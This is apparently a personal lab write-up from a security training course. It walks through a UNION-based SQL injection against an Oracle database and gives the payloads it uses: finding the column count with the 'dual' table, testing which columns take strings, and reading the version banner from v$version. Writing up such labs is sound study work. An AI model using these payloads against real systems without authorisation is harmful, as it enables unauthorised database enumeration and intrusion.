# Oracle querying database type and version

#WRITEUP
#DATABASEENUM

The lab mentions it's an `UNION` attack so following the [[Methodology UNION attacks]] , intercept the request and insert the payload to find out the number of columns that the result set has.

	Note: I looked for a hint since the regular UNION payloads didn't work it turns out that in Oracle databases the SELECT keyword must have a table to select FROM, in this case I used the 'dual' built-in table.

#SQLiPAYLOAD 
```SQL
' UNION SELECT NULL,NULL FROM dual--
```

![[Attacks/Enumerating the database/labs/SQL injection attack, querying the database type and version on Oracle/images/number of columns.png]]

The result set has two columns now find out which can hold string data.

![[Attacks/Enumerating the database/labs/SQL injection attack, querying the database type and version on Oracle/images/string data.png]]

#SQLiPAYLOAD 
```SQL
' UNION SELECT 'a',NULL FROM dual--

' UNION SELECT NULL,'a' FROM dual--
```

Both columns can hold string data. Let's inject the payload to obtain the database banner.


![[Attacks/Enumerating the database/labs/SQL injection attack, querying the database type and version on Oracle/images/solved.png]]

#SQLiPAYLOAD 
```SQL
' UNION SELECT banner,NULL FROM v$version--
```
